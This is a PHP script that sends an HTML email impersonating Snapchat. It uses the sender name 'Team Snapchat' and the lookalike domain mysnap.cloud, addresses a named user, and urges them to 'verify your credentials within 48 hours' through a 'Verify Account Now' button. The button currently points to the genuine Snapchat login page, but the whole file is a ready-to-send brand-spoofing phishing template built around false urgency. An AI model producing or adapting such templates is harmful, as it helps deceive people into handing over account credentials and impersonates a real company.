<?php
// Email configuration
$to = "security@mysnap.cloud"; // Recipient
$subject = "Snapchat: Security Alert";
$from = "security@mysnap.cloud";
$fromName = "Team Snapchat";

// HTML content
$htmlContent = '<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "https://www.w3.org/TR/html4/strict.dtd">
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Snapchat: Security Alert</title>
    <style type="text/css">
        body, td {font-size:13px; font-family: arial, sans-serif; margin: 0; padding: 0;}
        a:link, a:active {color:#1155CC; text-decoration:none}
        a:hover {text-decoration:underline; cursor: pointer}
        a:visited{color:#6611CC}
        img{border:0px; max-width: 100%; height: auto;}
    </style>
</head>
<body style="margin:0; padding:0; background-color:#f6f6f6;">
    <div style="background-color:#f6f6f6;color:#000000; padding: 0;">
        <center>
            <table width="620" style="max-width:620px;border-collapse:collapse;margin:0 auto" border="0" cellpadding="0" cellspacing="0">
                <tbody>
                    <tr>
                        <td>
                            <table border="0" width="100%" cellpadding="0" cellspacing="0" style="max-width:620px;">
                                <tbody>
                                    <tr>
                                        <td align="center" style="line-height:0; padding:0; margin:0;">
                                            <img src="https://i.imgur.com/MqWD4WR.jpg" alt="Snapchat" width="620" style="display:block; width:100%; max-width:620px; height:auto; margin:0; padding:0;">
                                        </td>
                                    </tr>
                                    <tr style="background:#ffffff">
                                        <td dir="ltr" align="center" style="font-family:AvenirNext-Regular,\'Droid Sans monospace\',Roboto,Arial,sans-serif; padding: 30px 20px 10px 20px;">
                                            <p style="font-size:45px;color:#000000;letter-spacing:0; margin: 0;">
                                                Account Security Alert
                                            </p>
                                        </td>
                                    </tr>
                                    <tr style="background:#ffffff">
                                        <td dir="ltr" border="0" style="padding:20px 40px 30px 40px;font-size:22px;color:#000000;letter-spacing:0;line-height:37px;font-family:AvenirNext-Regular,\'Droid Sans monospace\',Roboto,Arial,sans-serif">
                                            <p style="margin: 0 0 20px 0;">
                                                Hi aminaachristina, <br><br>
                                                We detected unusual activity on your Snapchat account and need to verify your identity to ensure your account remains secure. 
                                                <br><br>
                                                A security update has been initiated on your account. Please verify your credentials within 48 hours to confirm this change.
                                            </p>
                                            <p style="margin: 30px 0; text-align: center;">
                                                <a href="https://accounts.snapchat.com/accounts/login" style="display:inline-block;background-color:#0095f6;color:#ffffff;padding:14px 30px;text-decoration:none;border-radius:24px;font-weight:600;font-size:18px;" target="_blank">Verify Account Now</a>
                                            </p>
                                            <p style="margin: 30px 0 0 0; font-size: 18px; color: #666;">
                                                If you did not initiate this request, please secure your account immediately.
                                            </p>
                                        </td>
                                    </tr>
                                    <tr>
                                        <td align="center" style="line-height:0; padding:0; margin:0;">
                                            <img src="https://i.imgur.com/Sjb0gNa.jpg" alt="Snapchat Footer" width="620" style="display:block; width:100%; max-width:620px; height:auto; margin:0; padding:0;">
                                        </td>
                                    </tr>
                                    <tr>
                                        <td align="center" style="background:#f6f6f6; padding: 30px 20px;">
                                            <p style="margin:0;color:#262626;font-size:17px;letter-spacing:0;line-height:35px;font-family:AvenirNext-Regular,\'Droid Sans monospace\',Roboto,Arial,sans-serif">
                                                <span style="display:block">© Snap Inc. 2026 | <a href="https://snap.com/terms" style="text-decoration:none;color:#0eadff" target="_blank">Terms of Service</a></span>
                                                <span style="display:block"><a href="https://help.snapchat.com/hc" style="text-decoration:none;color:#000000" target="_blank">Snapchat Support</a></span>
                                                <span style="display:block">Snap Inc., 3000 31st Street, Santa Monica, CA 90405</span>
                                            </p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </td>
                    </tr>
                </tbody>
            </table>
        </center>
    </div>
</body>
</html>';

// Set headers
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: $fromName <$from>" . "\r\n";

// Send email
if(mail($to, $subject, $htmlContent, $headers)) {
    echo "Email sent successfully!";
} else {
    echo "Failed to send email.";
}
?>
